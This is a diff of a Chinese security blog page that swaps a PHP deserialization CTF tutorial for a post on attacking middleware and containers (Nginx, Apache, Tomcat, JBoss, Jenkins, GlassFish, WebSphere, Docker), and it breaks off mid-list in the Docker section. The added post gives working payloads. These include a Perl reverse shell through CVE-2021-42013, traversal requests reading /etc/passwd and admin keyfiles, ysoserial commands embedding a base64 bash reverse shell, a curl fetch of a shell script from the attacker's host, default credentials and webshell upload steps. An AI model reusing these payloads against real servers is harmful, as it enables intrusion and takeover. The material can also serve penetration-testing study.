@@ -4,9 +4,8 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="php反序列化, 白芨的小屋">
-    <meta name="description" content="PHP反序列化序列化为什么要进行序列化
-当对一个变量赋值后，在本次程序运行完成后，变量会从内存中清除掉。而序列化的目的时把变量保存在硬盘中，用到时可方便的通过反序列化把之前序列化的内容变回可用变量。即序列化用于在存储或传递PHP的值的过程中">
+    <meta name="keywords" content="服务安全-中间件&amp;容器, 白芨的小屋">
+    <meta name="description" content="Nginx，Apache，Tomcat，Weblogic，JBoos，Jenkin，GlassFish，Webshere，Docker，Jetty">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
@@ -18,7 +17,7 @@
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>php反序列化 | 白芨的小屋</title>
+    <title>服务安全-中间件&amp;容器 | 白芨的小屋</title>
     <link rel="icon" type="image/png" href="/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.min.css">
@@ -310,12 +309,12 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/1.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/banner/server.jpeg')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">php反序列化</h1>
+                    <h1 class="description center-align post-title">服务安全-中间件&amp;容器</h1>
                 </div>
             </div>
         </div>
@@ -431,16 +430,12 @@
                     
                     <div class="article-tag">
                         
-                            <a href="/tags/web%E5%AE%89%E5%85%A8/">
-                                <span class="chip bg-color">web安全</span>
+                            <a href="/tags/%E4%B8%AD%E9%97%B4%E4%BB%B6/">
+                                <span class="chip bg-color">中间件</span>
                             </a>
                         
-                            <a href="/tags/CTF/">
-                                <span class="chip bg-color">CTF</span>
-                            </a>
-                        
-                            <a href="/tags/PHP/">
-                                <span class="chip bg-color">PHP</span>
+                            <a href="/tags/%E5%AE%B9%E5%99%A8/">
+                                <span class="chip bg-color">容器</span>
                             </a>
                         
                     </div>
@@ -451,8 +446,8 @@
                     <div class="post-cate">
                         <i class="fas fa-bookmark fa-fw icon-category"></i>
                         
-                            <a href="/categories/web%E6%BC%8F%E6%B4%9E/" class="post-category">
-                                web漏洞
+                            <a href="/categories/%E6%9C%8D%E5%8A%A1%E5%AE%89%E5%85%A8/" class="post-category">
+                                服务安全
                             </a>
                         
                     </div>
@@ -464,7 +459,7 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2022-01-15
+                    2022-05-20
                 </div>
                 
 
@@ -473,7 +468,7 @@
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    1.4k
+                    3.1k
                 </div>
                 
 
@@ -493,243 +488,258 @@
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h1 id="PHP反序列化"><a href="#PHP反序列化" class="headerlink" title="PHP反序列化"></a>PHP反序列化</h1><h2 id="序列化"><a href="#序列化" class="headerlink" title="序列化"></a>序列化</h2><p><strong>为什么要进行序列化</strong></p>
-<p>当对一个变量赋值后，在本次程序运行完成后，变量会从内存中清除掉。而<strong>序列化</strong>的目的时把变量保存在硬盘中，用到时可方便的通过<strong>反序列化</strong>把之前序列化的内容变回可用变量。即序列化用于在存储或传递PHP的值的过程中，同时不丢失其类型和结构。利于对象的<strong>保存</strong>和<strong>传输</strong>。<br><img src="https://img-blog.csdnimg.cn/20210429223736297.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0phYXNlbnlp,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
-<h2 id="两个函数"><a href="#两个函数" class="headerlink" title="两个函数"></a>两个函数</h2><table>
-<thead>
-<tr>
-<th>序列化</th>
-<th>反序列化</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>对象转换为字符串</td>
-<td>特定格式的字符串转换为对象</td>
-</tr>
-<tr>
-<td>函数：serialize()</td>
-<td>函数：unseriasize()</td>
-</tr>
-</tbody></table>
-<p><strong>serialize():</strong></p>
-<p>当在php中创建了一个对象后，可以通过serialize()把这个对象转变成一个字符串，保存对象的值方便之后的传递与使用。</p>
-<p>eg:<br><img src="https://img-blog.csdnimg.cn/20210429223801901.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0phYXNlbnlp,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
-<p><strong>unserialize():</strong></p>
-<p>与 serialize() 对应，unserialize()用于将serialize() 函数序列化后的对象或数组进行反序列化，并返回原始对象结构。</p>
-<p><img src="https://img-blog.csdnimg.cn/20210429223824617.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0phYXNlbnlp,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
-<p>如果传递的字符串不可反序列化，则返回 FALSE，并产生一个E_NOTICE。</p>
-<p><img src="https://img-blog.csdnimg.cn/20210429223936636.jpg" alt="在这里插入图片描述"></p>
-<p><strong>字符串结构解释</strong></p>
-<p><strong>a:4:{s:4:”name”;s:4:”twds”;s:3:”age”;s:2:”22”;s:3:”sex”;s:3:”男”;s:5:”phone”;s:6:”123456”;}</strong></p>
+                <h1 id="服务安全-中间件-amp-容器"><a href="#服务安全-中间件-amp-容器" class="headerlink" title="服务安全-中间件&amp;容器"></a>服务安全-中间件&amp;容器</h1><h2 id="1、中间件-Nginx"><a href="#1、中间件-Nginx" class="headerlink" title="1、中间件-Nginx"></a>1、中间件-Nginx</h2><p><strong>文件解析&amp;命令执行</strong></p>
+<h3 id="1-1、后缀解析"><a href="#1-1、后缀解析" class="headerlink" title="1.1、后缀解析"></a>1.1、后缀解析</h3><p><strong>原因：</strong>配置不当：该漏洞与Nginx、php版本无关，属于<strong>用户配置不当</strong>造成的解析漏洞。</p>
+<p><strong>利用：</strong>在上传图片路径后增加<code>&#39;/xxx.php&#39;</code>后缀，被解析成PHP文件：</p>
+<h3 id="1-2、CVE-2013-4547-文件名逻辑漏洞"><a href="#1-2、CVE-2013-4547-文件名逻辑漏洞" class="headerlink" title="1.2、CVE-2013-4547-文件名逻辑漏洞"></a>1.2、CVE-2013-4547-文件名逻辑漏洞</h3><p><strong>CVE-2013-4547</strong></p>
+<p><strong>影响版本：</strong>Nginx 0.8.41 ~ 1.4.3 / 1.5.0 ~ 1.5.7</p>
+<p><strong>利用：</strong></p>
 <ul>
-<li>a-&gt;array</li>
-<li>s-&gt;strings</li>
-<li>a:4-&gt;代表集合中有4个元素</li>
-<li>s:4:’name’-&gt;类型 为string:变量长度为4个字节:变量名为name。（之后同理）</li>
+<li>上传时修改文件名为<code>x.jpg[0x20][0x00].php</code></li>
+<li><code>[0x20]是空格，[0x00]是&#39;\0&#39;</code>,可使用<code>burp-&gt;repeater-&gt;hex</code>中修改。</li>
 </ul>
-<h2 id="PHP中的魔术方法"><a href="#PHP中的魔术方法" class="headerlink" title="PHP中的魔术方法"></a>PHP中的魔术方法</h2><p><strong>PHP中把以两个下划线__开头的方法称为魔术方法</strong></p>
+<p><strong>参考：</strong><a target="_blank" rel="noopener" href="https://vulhub.org/#/environments/nginx/CVE-2013-4547/">https://vulhub.org/#/environments/nginx/CVE-2013-4547/</a></p>
+<h2 id="2、中间件-Apache"><a href="#2、中间件-Apache" class="headerlink" title="2、中间件-Apache"></a>2、中间件-Apache</h2><h3 id="2-1、cve-2021-42013-RCE"><a href="#2-1、cve-2021-42013-RCE" class="headerlink" title="2.1、cve_2021_42013 - RCE"></a>2.1、cve_2021_42013 - RCE</h3><p><strong>影响版本：</strong>Apache 2.4.49 和 Apache 2.4.50</p>
+<p><strong>利用：</strong>抓包，修改数据包反弹shell</p>
+<p>**Poc:**（反弹地址：120.55.xx.xx、监听5566端口）</p>
+<pre class="line-numbers language-none"><code class="language-none">POST &#x2F;cgi-bin&#x2F;.%%32%65&#x2F;.%%32%65&#x2F;.%%32%65&#x2F;.%%32%65&#x2F;bin&#x2F;sh 
+...
+...
+...
+
+echo;perl -e &#39;use Socket;$i&#x3D;&quot;120.55.xx.xx&quot;;$p&#x3D;5566;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;&#x2F;bin&#x2F;sh -i&quot;);&#125;;&#39;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h3 id="2-2、cve-2021-41773-目录穿越"><a href="#2-2、cve-2021-41773-目录穿越" class="headerlink" title="2.2、cve_2021_41773 - 目录穿越"></a>2.2、cve_2021_41773 - 目录穿越</h3><p>影响版本：Apache HTTP Server 2.4.49、2.4.50</p>
+<p>版本对路径规范化所做的更改中存在一个<strong>路径穿越漏洞</strong>，攻击者可利用该漏洞<strong>读取到Web目录外的其他文件，如系统配置文件、网站源码等</strong>，甚至在特定情况下，攻击者可构造恶意请求执行命令，控制服务器。</p>
+<p><strong>使用Burp：GET请求：</strong></p>
+<p><strong>cve_2021_41773 - 目录穿越-POC</strong></p>
+<pre class="line-numbers language-none"><code class="language-none">&#x2F;icons&#x2F;.%2e&#x2F;%2e%2e&#x2F;%2e%2e&#x2F;%2e%2e&#x2F;etc&#x2F;passwd <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><strong>补充：</strong></p>
+<p><strong>CVE-2021-41773</strong>漏洞在<strong>v2.4.50</strong>版本中进行了修复。但修复版本中只处理了<code>/xx/.%2e/</code>这样的路径，而没有正确处理<code>/.%%32%65/</code>这种字符串，导致<code>/.%%32%65/</code>被带入后续的处理，<strong>仍然可造成目录穿越</strong>。攻击者可构造恶意请求绕过补丁，利用穿越漏洞读取到Web目录之外的其他文件。</p>
+<p><strong>URL编码：</strong><code>2e -- &gt; %32%65</code></p>
+<p><strong>cve_2021_42013 - 目录穿越-POC</strong></p>
+<pre class="line-numbers language-none"><code class="language-none">&#x2F;icons&#x2F;.%%32%65&#x2F;%%32%65%%32%65&#x2F;%%32%65%%32%65&#x2F;%%32%65%%32%65&#x2F;etc&#x2F;passwd<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><strong>参考：</strong><a target="_blank" rel="noopener" href="https://www.cnblogs.com/L0ading/p/15406905.html">https://www.cnblogs.com/L0ading/p/15406905.html</a></p>
+<h3 id="2-3、cve-2017-15715-文件解析"><a href="#2-3、cve-2017-15715-文件解析" class="headerlink" title="2.3、cve-2017-15715 - 文件解析"></a><strong>2.3、cve-2017-15715 - 文件解析</strong></h3><p><strong>影响版本：</strong>2.4.0~2.4.29版本存在一个解析漏洞</p>
+<p>解析PHP时，1.php[0x0A]将被按照PHP后缀进行解析，导致绕过一些服务器的安全策略。</p>
+<p><strong>利用：</strong>（配合文件上传，适用于黑名单策略绕过）</p>
+<ul>
+<li>通过16进制的方式在<code>1.php</code>后面插入一个<code>0A</code></li>
+<li>可使用<code>burp-&gt;repeater-&gt;hex</code>中修改。</li>
+<li>访问上传成功的文件<code>/1.php%0a</code></li>
+</ul>
+<p>参考：<a target="_blank" rel="noopener" href="https://vulhub.org/#/environments/httpd/CVE-2017-15715/">https://vulhub.org/#/environments/httpd/CVE-2017-15715/</a></p>
+<h2 id="3、中间件-Tomcat"><a href="#3、中间件-Tomcat" class="headerlink" title="3、中间件-Tomcat"></a>3、中间件-Tomcat</h2><h3 id="3-1、弱口令猜解"><a href="#3-1、弱口令猜解" class="headerlink" title="3.1、弱口令猜解"></a>3.1、弱口令猜解</h3><p>配置不当导致后台弱口令，可通过上传<code>jsp</code>压缩包改名的<code>war</code>拿<code>shell</code></p>
+<p>可通过哥斯拉生成<code>jsp</code>后门 –&gt; 压缩zip，修改后缀war</p>
+<h3 id="3-2、CVE-2017-12615-文件上传"><a href="#3-2、CVE-2017-12615-文件上传" class="headerlink" title="3.2、CVE-2017-12615  - 文件上传"></a>3.2、CVE-2017-12615  - 文件上传</h3><p>当存在漏洞的Tomcat运行在Windows/Linux主机上， 且启用了<strong>HTTP PUT</strong>请求方法（ 例如， 将<code>readonly</code>初始化参数由默认值设置为false） ， 攻击者将有可能可通过精心构造的攻击请求数据包向服务器上传包含任意代码的<code>JSP</code>的<code>webshell</code>文件，<code>JSP</code>文件中的恶意代码将能被服务器执行， 导致服务器上的数据泄露或获取服务器权限。</p>
+<p><strong>影响版本：</strong>Apache Tomcat 7.0.0 - 7.0.79</p>
+<pre class="line-numbers language-none"><code class="language-none">PUT &#x2F;1.jsp&#x2F; HTTP&#x2F;1.1
+
+shell代码<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
+<h3 id="3-3、CVE-2020-1938-文件包含"><a href="#3-3、CVE-2020-1938-文件包含" class="headerlink" title="3.3、CVE-2020-1938 文件包含"></a>3.3、CVE-2020-1938 文件包含</h3><p>Apache Tomcat AJP协议（<strong>默认8009端口</strong>）由于存在实现缺陷导致相关<strong>参数可控</strong>，攻击者利用该漏洞可通过构造特定参数，读取服务器webapp目录下的任意文件。若服务器端同时存在文件上传功能，攻击者可进一步结合文件包含实现远程代码的执行。</p>
+<p><strong>影响版本：</strong></p>
+<ul>
+<li>Tomcat 6.*</li>
+<li>Tomcat 7.* &lt; 7.0.100</li>
+<li>Tomcat 8.* &lt; 8.5.51</li>
+<li>Tomcat 9.* &lt; 9.0.31</li>
+</ul>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">python CNVD-2020-10487-Tomcat-Ajp-lfi.py <span class="token number">120.55</span>.xx.xx -p <span class="token number">8009</span> -f WEB-INF/web.xml
+<span class="token comment"># exp: CNVD-2020-10487-Tomcat-Ajp-lfi.py</span>
+<span class="token comment"># https://github.com/YDHCUI/CNVD-2020-10487-Tomcat-Ajp-lfi</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
+
+
+<h2 id="4、中间件-Weblogic"><a href="#4、中间件-Weblogic" class="headerlink" title="4、中间件-Weblogic"></a>4、中间件-Weblogic</h2><p>管理控制台默认端口：http协议7001，https协议7002</p>
+<p>管理控制台默认URL路径：/console</p>
+<p>管理控制台默认URL路径：console/login/LoginForm.jsp</p>
+<p>CVE_2017_3506  </p>
+<p>CVE_2018_2893 </p>
+<p>CVE_2018_3245 </p>
+<p>CVE_2020_14882 </p>
+<p>CVE_2021_2394  </p>
+<h2 id="5、中间件-JBoos"><a href="#5、中间件-JBoos" class="headerlink" title="5、中间件-JBoos"></a>5、中间件-JBoos</h2><p>Jboss通常占用的端口是1098，1099，4444，4445，8080，8009，8083，8093这几个，</p>
+<p><strong>Red Hat JBoss Application Server</strong> 是一款基于<strong>JavaEE的开源应用服务器</strong>。</p>
+<h3 id="5-1、CVE-2017-12149"><a href="#5-1、CVE-2017-12149" class="headerlink" title="5.1、CVE-2017-12149"></a>5.1、CVE-2017-12149</h3><p><strong>JBOOS AS 5.X/6.X 反序列化漏洞</strong></p>
+<p><strong>影响版本：Jboss 5.x、Jboss6.x</strong></p>
+<p>1、访问<code>http://xx.xx.xx.xx:8080/invoker/readonly</code>，若显示HTTP Status 500,则说明存在漏洞</p>
+<p>2、使用**<code>ysoserial.jar</code>**这个工具生成各种反序列化的poc或者exp，里面包含了各种各样的反射链所使用到的库。</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># 生成poc.ser</span>
+java -jar ysoserial.jar CommonsCollections5 <span class="token string">"bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjAuNTUueHgueHgvNTU2NiAwPiYx&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;"</span> <span class="token operator">></span> poc.ser
+
+<span class="token comment"># post请求将poc.ser发送到漏洞存在页面地址</span>
+<span class="token function">curl</span> http://xx.xx.xx.xx:8080/invoker/readonly --data-binary @poc.ser
+
+<span class="token comment"># 监听5566端口</span>
+<span class="token comment"># YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjAuNTUueHgueHgvNTU2NiAwPiYx</span>
+<span class="token comment"># bash -i >&amp; /dev/tcp/120.55.xx.xx/5566 0>&amp;1</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h3 id="5-2、CVE-2017-7504"><a href="#5-2、CVE-2017-7504" class="headerlink" title="5.2、CVE-2017-7504"></a>5.2、CVE-2017-7504</h3><p><strong>JBoss AS 4.x</strong>及之前版本中，<code>JbossMQ</code>实现过程的<code>JMS over HTTP Invocation Layer</code>的<code>HTTPServerILServlet.java</code>⽂件存在反序列化</p>
+<p>漏洞，远程攻击者可借助特制的序列化数据利⽤该漏洞执⾏任意代码。</p>
+<p><strong>JBoss &lt;=4.x JBossMQJMS</strong> 反序列化漏洞</p>
+<p><strong>影响版本：JBoss AS 4.x及之前版本</strong></p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># 生成poc.ser</span>
+java -jar ysoserial.jar CommonsCollections5 <span class="token string">"bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjAuNTUueHgueHgvNTU2NiAwPiYx&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;"</span> <span class="token operator">></span> poc.ser
+
+<span class="token comment"># post请求将poc.ser发送到漏洞存在页面地址</span>
+<span class="token function">curl</span> http://xx.xx.xx.xx:8080/jbossmq-httpil/HTTPServerILServlet --data-binary @1.ser
+
+<span class="token comment">#监听5566端口</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h3 id="5-3、Administration-Console-弱口令"><a href="#5-3、Administration-Console-弱口令" class="headerlink" title="5.3、Administration Console 弱口令"></a><strong>5.3、Administration Console</strong> 弱口令</h3><p>Administration Console管理页面存在弱口令，admin:admin</p>
+<h2 id="6、中间件-Jenkins"><a href="#6、中间件-Jenkins" class="headerlink" title="6、中间件-Jenkins"></a>6、中间件-Jenkins</h2><p>默认端口：8080，Jenkins是一个开源软件项目，是<strong>基于Java开发的一种持续集成工具，用于监控持续重复的工作</strong>。</p>
+<h3 id="6-1、CVE-2017-1000353-RCE"><a href="#6-1、CVE-2017-1000353-RCE" class="headerlink" title="6.1、CVE-2017-1000353-RCE"></a>6.1、CVE-2017-1000353-RCE</h3><p><strong>影响版本：</strong></p>
+<ul>
+<li>所有Jenkins主版本均受到影响（包括&lt;=2.56版本）</li>
+<li>所有Jenkins LTS 均受到影响（包括&lt;=2.46.1版本）</li>
+</ul>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># 生成jenkins_poc.ser</span>
+<span class="token comment"># http://github.com/vulhub/CVE-2017-1000353    此exp使用JDK-1.8.0_291 其他版本失效</span>
+java -jar CVE-2017-1000353-1.1-SNAPSHOT-all.jar jenkins_poc.ser <span class="token string">"bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjAuNTUueHgueHgvNTU2NiAwPiYx&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;"</span>
+
+<span class="token comment"># 利用python发送jenkins_poc.ser</span>
+python exploit.py http://xx.xx.xx.xx:8080 jenkins_poc.ser
+
+<span class="token comment">#监听5566端口</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h3 id="6-2、CVE-2018-1000861-RCE"><a href="#6-2、CVE-2018-1000861-RCE" class="headerlink" title="6.2、CVE-2018-1000861-RCE"></a>6.2、CVE-2018-1000861-RCE</h3><p><strong>影响版本：</strong></p>
+<ul>
+<li>Jenkins 2.153及更早版本</li>
+<li>LTS 2.138.3及更早版本</li>
+<li>app=“Jenkins”</li>
+</ul>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># exp：https://github.com/adamyordan/cve-2019-1003000-jenkins-rce-poc</span>
+<span class="token comment"># 解决直接反弹shell无法监听，且命令执行无回显</span>
+<span class="token comment"># 1、通过命令执行使目标下载shell.txt 到本地/tmp/1.sh</span>
+<span class="token comment"># shell.txt: bash -i >&amp; /dev/tcp/120.55.xx.xx/5566 0>&amp;1</span>
+python2 exp.py http://xx.xx.xx.xx:xx/ <span class="token string">"curl -o /tmp/1.sh http://120.55.xx.xx:8888/shell.txt"</span>
+<span class="token comment"># 2、执行shell</span>
+python2 exp.py http://xx.xx.xx.xx:xx/ <span class="token string">"bash /tmp/1.sh"</span>
+
+<span class="token comment"># 开启web服务 python开启可看到实时访问状态</span>
+python3 -m http.server <span class="token number">8888</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h2 id="7、中间件-GlassFish"><a href="#7、中间件-GlassFish" class="headerlink" title="7、中间件-GlassFish"></a>7、中间件-GlassFish</h2><p><strong>默认端口：4848</strong>，GlassFish 是一款强健的<strong>商业兼容应用服务器</strong></p>
+<h3 id="7-1、CVE-2017-1000028-任意文件读取"><a href="#7-1、CVE-2017-1000028-任意文件读取" class="headerlink" title="7.1、CVE-2017-1000028-任意文件读取"></a>7.1、CVE-2017-1000028-任意文件读取</h3><p><strong>漏洞原理：</strong></p>
+<p>Java语言中会把<code>%c0%ae</code>解析为<code>\uC0AE</code>，最后转义为ASCCII字符的<code>.</code>（点）。利用<code>%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/</code>来向上跳转，达到<strong>目录穿越</strong>、<strong>任意文件读取</strong>的效果。</p>
+<p><strong>影响版本：</strong>&lt; 4.1.1</p>
+<pre class="line-numbers language-none"><code class="language-none">读密码：
+&#x2F;theme&#x2F;META-INF&#x2F;%c0.%c0.&#x2F;%c0.%c0.&#x2F;%c0.%c0.&#x2F;%c0.%c0.&#x2F;%c0.%c0.&#x2F;domains&#x2F;domain1&#x2F;config&#x2F;admin-keyfile
+
+读windows文件：
+&#x2F;theme&#x2F;META-INF&#x2F;prototype%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%afwindows&#x2F;win.ini
+
+读linux文件：
+&#x2F;theme&#x2F;META-INF&#x2F;%c0%ae%c0%ae&#x2F;%c0%ae%c0%ae&#x2F;%c0%ae%c0%ae&#x2F;%c0%ae%c0%ae&#x2F;%c0%ae%c0%ae&#x2F;%c0%ae%c0%ae&#x2F;%c0%ae%c0%ae&#x2F;%c0%ae%c0%ae&#x2F;%c0%ae%c0%ae&#x2F;%c0%ae%c0%ae&#x2F;etc&#x2F;passwd
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h2 id="8、中间件-Webshere"><a href="#8、中间件-Webshere" class="headerlink" title="8、中间件-Webshere"></a>8、中间件-Webshere</h2><p>WebShere 是 <strong>IBM 的软件平台</strong>。它包含了编写、运行和监视全天候的工业强度的随需应变 Web 应用程序和跨平台、跨产品解决方案所需要的整个中间件基础设施，如服务器、服务和工具。</p>
+<p><strong>漏洞探测在8880端口，后台是9060端口，解析是9080端口</strong></p>
 <table>
 <thead>
 <tr>
-<th>常见php魔术方法</th>
-<th></th>
+<th>端口</th>
+<th>服务</th>
 </tr>
 </thead>
 <tbody><tr>
-<td>__construct()</td>
-<td>类的构造函数，当一个对象创建时被调用</td>
+<td>9080</td>
+<td>http</td>
 </tr>
 <tr>
-<td>__destruct()</td>
-<td>类的析构函数，当一个对象销毁时被调用</td>
+<td>9443</td>
+<td>https</td>
 </tr>
 <tr>
-<td>__wakeup()</td>
-<td>执行unserialize()时会先调用这个函数</td>
+<td>9060</td>
+<td>管理后台访问端口</td>
 </tr>
 <tr>
-<td>__sleep()</td>
-<td>执行serialize()时会先调用这个函数</td>
+<td>9043</td>
+<td>管理控制台安全端口</td>
 </tr>
 <tr>
-<td>__toString()</td>
-<td>类被当成字符串时的被调用</td>
-</tr>
-<tr>
-<td>__isset()</td>
-<td>在不可访问的属性上调用isset()或empty()触发</td>
-</tr>
-<tr>
-<td>__unset()</td>
-<td>在不可访问的属性上使用unset()时触发</td>
-</tr>
-<tr>
-<td>__get()</td>
-<td>用于从不可访问的属性读取数据</td>
-</tr>
-<tr>
-<td>__set()</td>
-<td>用于将数据写入不可访问的属性</td>
-</tr>
-<tr>
-<td>__call()</td>
-<td>在对象上下文中调用不可访问的方法时触发</td>
-</tr>
-<tr>
-<td>__invoke()</td>
-<td>当脚本尝试将对象调用为函数时触发</td>
+<td>8880</td>
+<td>SOAP连接器端口</td>
 </tr>
 </tbody></table>
-<h2 id="PHP反序列化漏洞"><a href="#PHP反序列化漏洞" class="headerlink" title="PHP反序列化漏洞"></a>PHP反序列化漏洞</h2><p><strong>产生反序列化的原因：</strong></p>
-<p>根本原因：是程序没有对用户输入的反序列化字符串进行检测，导致<strong>反序列化过程</strong>可以被<strong>用户</strong>恶意控制，进而造成代码执行、getshell等一系列不可控的后果。反序列化漏洞并不是PHP特有，也存在于Java、Python等语言之中，但其原理基本相通。</p>
-<p><strong>漏洞产生条件：</strong></p>
+<p><strong>1、CVE-2015-7450 反序列化</strong></p>
+<pre class="line-numbers language-none"><code class="language-none">探测在8880端口
+java反序列化工具<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+<p><strong>2、弱口令&amp;未授权访问 上传拿Shell</strong></p>
+<p><strong>在6.x至7.0版本</strong>，后台登陆只需要输入<code>admin</code>作为用户标识，无需密码，即可登陆后台。</p>
+<p>默认账号密码：</p>
 <ul>
-<li>unserialize()函数的参数可控</li>
-<li>php中有可以利用的类并且类中有魔术方法</li>
+<li>websphere/ websphere</li>
+<li>system/ manager</li>
 </ul>
-<h2 id="CTF真题"><a href="#CTF真题" class="headerlink" title="CTF真题"></a>CTF真题</h2><p><strong>2020-网鼎杯-青龙组-Web-AreUSerialz</strong></p>
-<p>题目源码如下：</p>
-<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># 上传：war马</span>
+Applications --<span class="token operator">></span> websphere enterprise applications --<span class="token operator">></span> <span class="token function">install</span> --<span class="token operator">></span> 上传war包 -<span class="token operator">></span> next<span class="token punctuation">..</span>. -<span class="token operator">></span>设置war包访问路径/1
+<span class="token comment"># 连接：http://xxx/1/1.jsp</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
 
-<span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"flag.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 
-<span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 
-<span class="token keyword">class</span> <span class="token class-name-definition class-name">FileHandler</span> <span class="token punctuation">&#123;</span>
+<h2 id="9、Docker安全"><a href="#9、Docker安全" class="headerlink" title="9、Docker安全"></a>9、Docker安全</h2><p>Docker容器是使用<strong>沙盒机制</strong>，是单独的系统，理论上是很安全的，通过利用某种手段，再结合执行POC或EXP，就可以<strong>返回一个宿主机的高权限Shell</strong>，并拿到宿主机的<strong>root</strong>权限，可以直接操作宿主机文件。 它从容器中逃了出来，因此我们形象的称为<strong>Docker逃逸漏洞</strong>。</p>
+<p><strong>容器判断:</strong></p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># 是否存在.dockerenv文件</span>
+<span class="token function">ls</span> -alh /.dockerenv
 
-    <span class="token keyword">protected</span> <span class="token variable">$op</span><span class="token punctuation">;</span>
-    <span class="token keyword">protected</span> <span class="token variable">$filename</span><span class="token punctuation">;</span>
-    <span class="token keyword">protected</span> <span class="token variable">$content</span><span class="token punctuation">;</span>
+<span class="token comment">#查询系统进程的cgroup信息：</span>
+<span class="token function">cat</span> /proc/1/cgroup<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
-    <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
-        <span class="token variable">$op</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"1"</span><span class="token punctuation">;</span>
-        <span class="token variable">$filename</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"/tmp/tmpfile"</span><span class="token punctuation">;</span>
-        <span class="token variable">$content</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"Hello World!"</span><span class="token punctuation">;</span>
-        <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">process</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-    <span class="token punctuation">&#125;</span>
+<p><strong>容器逃逸漏洞：权限提升</strong></p>
+<ul>
+<li>由内核漏洞引起 ——Dirty COW(CVE-2016-5195)</li>
